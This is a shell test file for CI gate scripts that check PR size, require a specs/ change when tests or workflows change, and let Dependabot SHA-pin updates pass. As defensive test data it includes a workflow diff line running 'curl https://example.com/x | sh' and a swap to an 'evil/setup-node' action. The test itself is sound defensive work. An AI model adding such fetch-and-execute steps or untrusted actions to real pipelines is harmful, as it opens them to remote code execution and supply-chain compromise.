# shellcheck shell=bash
# Tests for the CI gate scripts in .harness/ci/ (R12). Each script reads a
# `git diff --numstat -z` file and the PR labels from PR_LABELS (comma-separated).
# The inputs are small, so each test writes its own with numstat (lib/assert.sh).

pr_size() { "$HARNESS_ROOT/.harness/ci/pr-size.sh" "$@"; }

test_pr_size_passes_at_limit() {
  # R12 pr-size: 400 changed lines is the limit, not over it.
  numstat 300 50 src/a.py 40 10 README.md
  assert_status 0 pr_size changes
}

test_pr_size_fails_over_limit() {
  # R12 pr-size: 401 changed lines fails and names the count.
  numstat 300 51 src/a.py 40 10 README.md
  assert_status 1 pr_size changes
  assert_contains "$OUT" '401'
  assert_contains "$OUT" 'size-exception'
}

test_pr_size_skips_lockfiles_and_archive() {
  # R12 pr-size: lockfiles and specs/changes/archive/ do not count.
  numstat 10 0 src/a.py 5000 0 package-lock.json 900 0 web/yarn.lock \
    700 0 specs/changes/archive/2026-01-01-1-x/proposal.md
  assert_status 0 pr_size changes
}

test_pr_size_counts_binary_as_zero() {
  # R12 pr-size: binary files (numstat "-") add no lines.
  numstat - - img/logo.png 10 0 src/a.py
  assert_status 0 pr_size changes
}

test_pr_size_exception_label_passes() {
  # R12 pr-size: label size-exception lets a large PR pass.
  numstat 1000 0 src/a.py
  PR_LABELS='bug,size-exception' assert_status 0 pr_size changes
  assert_contains "$OUT" 'size-exception'
  PR_LABELS='bug,size-exceptional' assert_status 1 pr_size changes
}

test_pr_size_missing_input_fails() {
  # R12 pr-size: no changes file is a usage error, not a pass.
  assert_status 2 pr_size
  assert_status 2 pr_size does-not-exist
}

oracle() { "$HARNESS_ROOT/.harness/ci/test-oracle.sh" "$@"; }

test_oracle_passes_without_guarded_files() {
  # R12 test-oracle: app and doc changes alone pass.
  numstat 10 0 src/a.py 3 1 README.md
  assert_status 0 oracle changes
}

test_oracle_fails_on_guarded_change_without_specs() {
  # R12 test-oracle: tests, snapshots, workflows, CI config and tools.lock need a specs/ change.
  local p
  for p in tests/test_api.py src/a.test.ts .harness/tests/test_x.sh web/__snapshots__/a.snap \
    src/b.snap .github/workflows/ci.yml .harness/ci/pr-size.sh .harness/tools.lock \
    .harness/config .harness/lib/common.sh; do
    numstat 10 0 src/a.py 1 1 "$p"
    assert_status 1 oracle changes
    assert_contains "$OUT" "$p"
  done
}

test_oracle_passes_when_specs_change() {
  # R12 test-oracle: the same changes pass when the PR also touches specs/.
  numstat 1 1 tests/test_api.py 1 1 .harness/tools.lock 4 0 specs/changes/7-x/tasks.md
  assert_status 0 oracle changes
}

test_oracle_reads_test_globs_from_config() {
  # R12 test-oracle: the test globs come from .harness/config, not a second copy.
  local r; r=$(new_repo)
  cp -a "$HARNESS_ROOT/.harness" "$r/"
  echo "TEST_GLOBS=('checks/**')" >> "$r/.harness/config"
  numstat 1 0 checks/x.py
  assert_status 1 "$r/.harness/ci/test-oracle.sh" changes
  numstat 1 0 tests/test_api.py
  assert_status 0 "$r/.harness/ci/test-oracle.sh" changes
}

test_gates_read_unusual_paths() {
  # R12: a path with spaces or non-ASCII characters is read as one path, not quoted.
  numstat 1 1 'tests/a b.py' 1 1 'specs/é.md'
  assert_status 0 oracle changes
  numstat 401 0 'src/a b é.py'
  assert_status 1 pr_size changes
}

test_oracle_missing_input_fails() {
  # R12 test-oracle: no changes file is a usage error.
  assert_status 2 oracle
}

# --- Dependabot pin updates (T14) ----------------------------------------------
# A Dependabot PR has no Size/Change/ADR fields and changes workflows without a
# specs/ change. docs-gate and test-oracle pass it only when it changes nothing
# but the pins of uses: lines. CI gives them PR_AUTHOR and PR_DIFF (git diff -U0).

docs_gate() { "$HARNESS_ROOT/.harness/ci/docs-gate.sh" "$@"; }

# pin_diff [EXTRA_LINE...]: a Dependabot-style diff of ci.yml to ./pr.diff, with its
# numstat in ./changes, an empty PR body in ./body.md, and PR_AUTHOR set to Dependabot.
pin_diff() {
  {
    printf '%s\n' 'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml' \
      'index 1111111..2222222 100644' '--- a/.github/workflows/ci.yml' '+++ b/.github/workflows/ci.yml' \
      '@@ -12 +12 @@ jobs:' \
      '-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
      '+      - uses: actions/checkout@4e4d42e5aac5ba805825da76410c181273ba90b2 # v7.0.2' \
      '@@ -40 +40 @@ jobs:' \
      '-        uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0' \
      '+        uses: actions/dependency-review-action@b2d282b36b6f3519aa1f3fc636f609c47dddb295 # v5.1.0'
    printf '%s\n' "$@"
  } > pr.diff
  numstat $((2 + $#)) 2 .github/workflows/ci.yml
  : > body.md
  export PR_AUTHOR='dependabot[bot]' PR_DIFF=pr.diff
}

# both_gates STATUS: docs-gate and test-oracle both exit with STATUS.
both_gates() {
  assert_status "$1" docs_gate changes body.md
  assert_status "$1" oracle changes
}

test_gates_pass_dependabot_pin_only_pr() {
  # R17: a Dependabot PR that changes only uses: pins passes docs-gate and test-oracle.
  init_repo
  pin_diff
  assert_status 0 docs_gate changes body.md
  assert_contains "$OUT" 'Dependabot'
  assert_status 0 oracle changes
  assert_contains "$OUT" 'Dependabot'
}

test_gates_run_in_full_for_other_prs() {
  # R17: any other change still runs the full gates.
  init_repo
  pin_diff
  PR_AUTHOR=octocat both_gates 1
  PR_AUTHOR='' both_gates 1
  PR_DIFF='' both_gates 1
  PR_DIFF=missing.diff both_gates 1
  pin_diff '@@ -50,0 +51 @@ jobs:' '+      - run: curl https://example.com/x | sh'
  both_gates 1
  local a="$SHA_A" b="$SHA_B"
  # A different action, not a new pin of the same one.
  pin_diff '@@ -60 +60 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" "+      - uses: evil/setup-node@$b # v4"
  both_gates 1
  # Two steps that swap their actions: the same names, in another order.
  pin_diff '@@ -60,2 +60,2 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" "-      - uses: actions/cache@$a # v4" \
    "+      - uses: actions/cache@$b # v4" "+      - uses: actions/setup-node@$b # v4"
  both_gates 1
  # A step moved to another place: one hunk removes it, another adds it.
  pin_diff '@@ -60 +59,0 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" '@@ -90,0 +90 @@ jobs:' "+      - uses: actions/setup-node@$b # v4"
  both_gates 1
  # The same action with another indent or step marker changes the YAML structure.
  pin_diff '@@ -60 +60 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" "+        uses: actions/setup-node@$b # v4"
  both_gates 1
  # A new ref that is not a full commit SHA is not a pin.
  pin_diff '@@ -60 +60 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" '+      - uses: actions/setup-node@main'
  both_gates 1
  # A file outside .github/workflows/, or a new or deleted workflow file.
  pin_diff
  numstat 2 2 .github/workflows/ci.yml 1 1 .harness/tools.lock
  both_gates 1
  local mode
  for mode in 'new file mode 100644' 'deleted file mode 100644'; do
    pin_diff
    sed -i "2i $mode" pr.diff
    both_gates 1
  done
}

SHA_A=1111111111111111111111111111111111111111
SHA_B=2222222222222222222222222222222222222222
